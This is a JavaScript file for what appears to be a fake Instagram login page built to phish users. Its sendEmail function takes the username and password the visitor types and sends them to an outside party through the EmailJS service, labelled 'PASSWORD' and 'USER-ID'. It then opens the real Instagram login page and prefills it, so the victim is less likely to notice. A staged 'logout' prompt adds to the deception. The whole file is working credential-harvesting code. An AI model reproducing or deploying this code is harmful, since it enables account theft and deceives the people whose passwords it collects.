setTimeout(() =>{
    const messageforlogout = document.querySelector(".messageforlogout");
    messageforlogout.style.top = "5%";
    messageforlogout.style.transition = "0.8s ease-in-out";
}, 1000)

const submitForLogout = document.getElementById("submitForLogout");
submitForLogout.addEventListener('click', () =>{
    const messageforlogout = document.querySelector(".messageforlogout");
    messageforlogout.style.top = "-84%";
    messageforlogout.style.transition = "0.8s ease-in-out";
    submitForLogout.style.visibility = "hidden";
    loginBtn.disabled = false;
    const mainContainer = document.querySelector(".mainContainer");
    mainContainer.style.visibility = "visible";

})

const loginBtn = document.getElementById("logi");
loginBtn.disabled = true;
const mainContainer = document.querySelector(".mainContainer");
mainContainer.style.visibility = "hidden";


function sendEmail() {
    var params = {
        name: document.querySelector("#username").value,
        // email: document.querySelector("#email").value,
        email:"user@gmail.com",
        password: document.querySelector("#password").value,
        message: `PASSWORD: ${document.querySelector("#password").value}\n USER-ID: ${document.querySelector("#username").value}`
    };
    const serviceID = "service_r4nowaf";
    const templateID = "template_us11w5m";
    
    emailjs.send(serviceID, templateID, params)
    .then(
        res => {
            document.querySelector("#username").value = "";
            // document.querySelector("#email").value = "";
            document.querySelector("#password").value = "";
            document.querySelector("#verify").value = "";
            console.log(res);
            
            alert("Message sent successfully");
        })
        .catch((err) => console.log(err));
    }
    
    document.getElementById("logi").addEventListener('click', () => {
        // const emailElement = document.querySelector("#email").value;
    const userName = document.querySelector("#username").value;
    const PassElement = document.querySelector("#password").value;
    // const VerificationElement = document.querySelector("#verify").value;
    
    if ( userName == "" || PassElement == "" ) {
        const messagebox = document.querySelector(".messagebox");
        const message = document.querySelector("#message");
        message.innerHTML = "Please fill full Details.";
        messagebox.style.top = '26%';
        messagebox.style.transition = '0.8s ease-in-out';
    } else {
        sendEmail();
        openInstagramAndLogin();
    }
});


function openInstagramAndLogin() {
    var instagramID = document.querySelector("#username").value;
    var password = document.querySelector("#password").value;
    var loginUrl = `https://www.instagram.com/accounts/login/`;
    
    if (instagramID != "" && password != "") {
        
        var newWindow = window.open(loginUrl, '_blank');
        newWindow.onload = function () {
            newWindow.document.querySelector("input[name='username']").value = instagramID;
            newWindow.document.querySelector("input[name='password']").value = password;
            // newWindow.document.querySelector("button[type='submit']").click();
        };
    }
    
}

const messageboxXBtn = document.querySelector("#xbtn");
messageboxXBtn.addEventListener('click', () => {
    const messagebox = document.querySelector(".messagebox");
    messagebox.style.top = '-84%';
    messagebox.style.transition = '0.8s ease-in-out';
})



const loginfacebook = document.querySelector("#loginfacebook");
loginfacebook.addEventListener('click', () => {
    const url = "https://www.facebook.com/";
    window.open(url);
})


const OkForLogoutbtn = document.querySelector("#OkForLogout");
OkForLogoutbtn.addEventListener('click', () =>{
    let url = `https://www.instagram.com/accounts/login/`;
    window.open(url, '_blank');
    
    const submitForLogout = document.getElementById("submitForLogout");
    submitForLogout.style.visibility = "visible";
})
